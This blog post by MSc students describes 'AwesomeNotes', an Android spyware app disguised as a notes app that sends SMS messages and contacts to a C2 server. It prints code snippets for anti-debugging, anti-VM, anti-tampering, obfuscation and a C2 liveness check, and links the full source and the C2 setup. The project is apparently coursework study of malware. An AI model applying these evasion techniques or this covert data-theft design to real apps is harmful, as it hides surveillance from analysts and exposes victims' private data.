---
title: "The homemade Pegasus [EN]"
date: 2022-06-02T17:03:28+02:00
draft: false
---
{{< justify-text >}}

### Introduction :mag:

In the last few months, the growing trend of spyware [^1] and the report [^2] of socially recognized and famous victims made that the word "*Pegasus*" appears in our conversations with friends over coffee or on the front pages of the media. 

But, what is *Pegasus*? Basically, is a spyware that can infiltrate a device and harvest personal and location data, control the phone's microphones and cameras without the user's knowledge or permission. This tool was made by the Israeli technology company NSO Group, and several reports informs that it affected heads of state including Emmanuel Macron (France), Pedro Sánchez (Spain),  the South African President Cyril Ramaphosa among others. But the best known case could be called that of Jeff Bezos mobile infection, which is explained in detail in the following video of the cybersecurity content creator [Marcelo Vázquez (aka. s4vitar)](https://www.linkedin.com/in/s4vitar/).

{{< youtube id="rABIDoDKGB0" >}}  

### ¿So, what we do? :computer:

Due to the above arguments, combined with the proposal of the design of a malicious app for Android 8.1 in a subject of our MSc, we decided to create an ostensibly apk for the creation and management of notes. We called it *AwesomeNotes*, but its hidden features go much further than previously described...

![AwesomeNotes](/awesome-notes.jpeg 'AwesomeNotes app')

The app collects private information from our devices such SMS, contact numbers among other data and sends it to a C2 server over HTTPS. It's a sophisticated application due to the protection measures implemented on it to avoid analysis through the application of reverse engineering. Among them the following stand out:  

- Anti-debugging.
```java
// Anti-debugging check
boolean isBeingDebugged = android.os.Debug.isDebuggerConnected();
```
- Anti-backup.
```java
// Anti-backup check
boolean isBackupAllowed = (getApplicationInfo().flags & ApplicationInfo.FLAG_ALLOW_BACKUP) != 0;
```
- Anti-tampering.
```java
// Anti-Tampering
CRC32 crc = new CRC32();
crc.update(bytes);

boolean isTampered = crc.getValue() != Long.parseLong(getString(R.string.crc));
```
- Code ofuscation.
```java
buildTypes {
    release {
        // Enable code optimization and obfuscation (in build.gradle)
        minifyEnabled true
        shrinkResources true

        proguardFiles getDefaultProguardFile('proguard-android-optimize.txt'), 'proguard-rules.pro'

        signingConfig signingConfigs.release
    }
}
```

- Anti-virtualization.
```java
// Anti-VM
try {
    isVirtualized = Utils.hasGenyFiles() || Utils.hasEth0Interface() || Utils.hasQEmuProps(getApplicationContext()) ||
            Utils.hasPipes() || Utils.hasEmulatorBuild(getApplicationContext()) || Utils.isOperatorNameAndroid(getApplicationContext()) ||
            Utils.hasQEmuDrivers() || Utils.hasQEmuFiles() || Utils.hasTracerPid() || Utils.hasAppAnalysisPackage(getApplicationContext()) ||
            Utils.hasTaintClass() || Utils.detectsensor(getApplicationContext());
} catch (IOException e) {
    System.out.println("Anti-analysis: VM check failed");
}
```
- Polymorphism.
```java
// Polymorphism
System.out.println(RANDOM);
```
- Conectivity check with C2 server.
```java
// Connectivity check
AliveAPI api = new AliveAPI();

try { if (Integer.parseInt(api.execute(getString(R.string.c2) + "alive").get()) != 200) throw new Exception(); }
catch (Exception e) {
    System.out.println("Anti-analysis: Server down");
    start = false;
}
```
- Communication encryption (HTTPS using self-signed certificate).

Both source code, the apk's with or without anti-analysis measures and the deployment instructions for the evil C2 server infraestructure are available in the following [public GitHub repository](https://github.com/javirodriguezzz/awesome-notes-malware).

### Contributors

|   **Contributor Name**   	|                                   **Contributions**                                   	|                                                    **Socials**                                                   	|
|:------------------------:	|:-------------------------------------------------------------------------------------:	|:----------------------------------------------------------------------------------------------------------------:	|
|   _David Landín Calvo_   	| UI design, anti-analysis measures, integrity system control, communication encryption 	| [LinkedIn](https://www.linkedin.com/in/david-land%C3%ADn-calvo-528ab91a3/) [GitHub](https://github.com/david-lc) 	|
|   _David Soler García_   	|                              UI design, malicious service, *send* Endpoint                             	|  [LinkedIn](https://www.linkedin.com/in/david-soler-garc%C3%ADa-90b21b1a5/) [GitHub](https://github.com/SDABIS)  	|
| _Javier Rodríguez Campo_ 	|        Integration of anti-virtualization techniques, communication encryption        	|           [LinkedIn](https://www.linkedin.com/in/jrcampo/) [GitHub](https://github.com/javirodriguezzz)          	|                 |

[^1]: *Source [MSSP Alert](https://www.msspalert.com/cybersecurity-guests/stalkerware-detection-trends-monitor-and-spyware-findings/)*
[^2]: *[Verizon report](https://www.verizon.com/business/resources/reports/2020-data-breach-investigations-report.pdf)*